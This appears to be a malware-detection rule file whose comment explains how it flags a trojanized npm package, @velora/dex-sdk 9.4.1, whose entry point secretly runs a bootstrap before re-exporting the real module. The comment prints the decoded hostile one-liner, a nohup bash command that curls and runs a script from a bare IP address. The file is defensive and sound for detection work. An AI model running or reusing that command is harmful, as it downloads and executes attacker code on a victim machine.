# A package entry point whose bootstrap pulls from a bare IP address.
#
# The trojanized @velora/dex-sdk 9.4.1 keeps its real `module.exports =
# require('./sdk...')` tail, so the module behaves exactly as advertised. The
# single added line above it decodes to:
#
#   nohup bash -c "$(curl -fsSL http://89.36.224.5/troubleshoot/mac/install.sh)" > /dev/null 2>&1
#
# The supply-chain rules describe the shape -- an entry point that
# shell-bootstraps before re-exporting. This describes the destination, and it
# is what an incident responder acts on first: a hardcoded IPv4 address over
# cleartext HTTP, with no domain to sinkhole and no TLS to inspect.
#
# The distinction matters because the two facts decay differently. The
# bootstrap shape is how this family of packages is built and will show up
# again in the next one; the address is a live indicator that can be blocked
# now, searched for in proxy logs, and correlated with other victims. A
# finding that only says "this package bootstraps a shell" leaves the
# responder without the one detail they can act on today.
defaults:
  platforms: [unix, macos]
  for: [javascript, typescript, text]
  attack: T1105,T1071.001,T1571
  mbc: B0030

composite_rules:
  - id: entrypoint-bootstrap-fetches-from-bare-ip
    desc: Entry-point bootstrap fetches from an IP
    crit: hostile
    conf: 0.95
    all:
      - id: micro-behaviors/process/create/shell/bridge::js-exec-decode-pipe-shell-command
    any:
      - id: objectives/command-and-control/channel/http/transport::direct-ip-http-channel
      - id: objectives/command-and-control/beacon/network/http::direct-http-c2
      - id: objectives/anti-static/obfuscation/payload/encoded::decoded-ip-address
